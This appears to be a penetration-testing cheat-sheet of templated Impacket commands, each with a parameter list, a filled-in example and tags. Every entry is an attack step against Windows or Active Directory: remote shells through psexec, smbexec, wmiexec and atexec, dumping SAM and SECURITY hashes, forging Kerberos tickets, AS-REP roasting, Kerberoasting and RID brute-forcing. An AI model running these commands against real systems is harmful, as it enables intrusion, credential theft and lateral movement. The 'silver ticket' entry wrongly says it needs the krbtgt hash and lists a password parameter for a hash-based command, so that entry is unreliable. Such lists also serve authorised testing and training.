
---
Description :
     Impacket psexec.py — interactive shell via SMB

Parameters : #domain #username #password #target-ip

```cmd
impacket-psexec {{domain}}/{{username}}:'{{password}}'@{{target-ip}}
```

```example
impacket-psexec CORP/administrator:'Passw0rd!'@10.10.10.10
```

Tags :  #linux #impacket #psexec #windows #toolkit

---

Description :
     Impacket smbexec.py — non-interactive service technique

Parameters : #domain #username #password #target-ip

```cmd
impacket-smbexec {{domain}}/{{username}}:'{{password}}'@{{target-ip}}
```

```example
impacket-smbexec WORKGROUP/Administrator:'Welcome1!'@10.10.10.10
```

Tags :  #linux #impacket #smbexec #toolkit

---

Description :
     Impacket wmiexec.py — semi-interactive WMI shell

Parameters : #domain #username #password #target-ip

```cmd
impacket-wmiexec {{domain}}/{{username}}:'{{password}}'@{{target-ip}}
```

```example
impacket-wmiexec ./administrator:'hashorpass'@10.10.10.10
```

Tags :  #linux #impacket #wmiexec #toolkit

---

Description :
     Impacket atexec.py — task scheduler execution

Parameters : #domain #username #password #target-ip

```cmd
impacket-atexec {{domain}}/{{username}}:'{{password}}'@{{target-ip}} "whoami"
```

```example
impacket-atexec CORP/user:'x'@10.10.10.10 "whoami"
```

Tags :  #linux #impacket #atexec #toolkit

---

Description :
     Impacket secretsdump — SAM SECURITY local files offline

Parameters : #directory

```cmd
impacket-secretsdump -sam {{directory}}/SAM -system {{directory}}/SYSTEM -security {{directory}}/SECURITY LOCAL
```

```example
impacket-secretsdump -sam ./SAM -system ./SYSTEM -security ./SECURITY LOCAL
```

Tags :  #linux #impacket #secretsdump #toolkit

---

Description :
     Impacket ticketer — forge silver ticket (needs krbtgt hash and domain SID)

Parameters : #domain #username #password

```cmd
impacket-ticketer -nthash {{hash}} -domain-sid S-1-5-21-xxx -domain {{domain}} {{username}}
```

```example
impacket-ticketer -nthash abc... -domain-sid S-1-5-21-... -domain CORP fakeuser
```

Tags :  #linux #impacket #kerberos #ticketer #toolkit

---

Description :
     Impacket GetNPUsers — ASREProast (no pre-auth users)

Parameters : #domain #user-file

```cmd
impacket-GetNPUsers {{domain}}/ -usersfile {{user-file}} -format hashcat -outputfile asrep.txt
```

```example
impacket-GetNPUsers CORP/ -usersfile users.txt -format hashcat -outputfile asrep.txt
```

Tags :  #linux #impacket #kerberos #asreproast #toolkit

---

Description :
     Impacket GetUserSPNs — Kerberoastable SPNs

Parameters : #domain #username #password

```cmd
impacket-GetUserSPNs {{domain}}/{{username}}:'{{password}}' -request -outputfile kerb.txt
```

```example
impacket-GetUserSPNs CORP/jdoe:'x' -request -outputfile kerb.txt
```

Tags :  #linux #impacket #kerberoast #toolkit

---

Description :
     Impacket lookupsid — RID brute / SID resolution

Parameters : #domain #username #password #target-ip

```cmd
impacket-lookupsid {{domain}}/{{username}}:'{{password}}'@{{target-ip}}
```

```example
impacket-lookupsid CORP/guest:''@10.10.10.10
```

Tags :  #linux #impacket #enum #toolkit

---

Description :
     Impacket rpcdump — interface enumeration

Parameters : #username #password #target-ip

```cmd
impacket-rpcdump {{target-ip}} -username '{{username}}' -password '{{password}}'
```

```example
impacket-rpcdump 10.10.10.10 -username 'user' -password 'pass'
```

Tags :  #linux #impacket #rpc #toolkit

---
